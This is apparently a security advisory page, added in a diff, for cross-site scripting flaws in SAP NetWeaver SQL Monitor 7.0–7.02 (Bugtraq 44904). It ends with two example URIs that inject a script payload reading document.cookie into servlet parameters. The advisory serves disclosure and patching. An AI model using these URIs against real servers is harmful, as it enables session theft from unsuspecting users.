@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid44904<p><b><span style="font-size: 18pt;">SAP NetWeaver SQL Monitor Multiple Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/44904/info">info</a><br><a href="http://www.securityfocus.com/bid/44904/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/44904/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/44904/solution">solution</a><br><a href="http://www.securityfocus.com/bid/44904/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				44904
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 17 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 17 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				a.polyakov and a.troshichev from Digital Security Research Group
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SAP NetWeaver   7.02<br/>
+					
+				
+					SAP NetWeaver   7.01<br/>
+					
+				
+					SAP NetWeaver   7.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit these issues by enticing an unsuspecting user to follow a malicious URI.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com:50100/OpenSQLMonitors/servlet/ConnectionMonitorServlet?view=stmtpool&amp;amp;node=12924950&amp;amp;ds=SAPSR3DB&amp;amp;connid<br/>=com.sap.sql.jdbc.direct.DirectPooledConnection@1ed00a7&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;<br/><br/>http://www.example.com:50100/OpenSQLMonitors/servlet/CatalogBufferMonitorServlet?action=btnSHOW_COLUMNS&amp;amp;reqNode=12924950&amp;amp;reqBufferId=<br/>SAPSERVER:dm0:SAPSR3DB&amp;amp;reqTableColumns=BC_RPROF_PROFILE&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;
+	
+		<ul>
+</ul>
+</div>
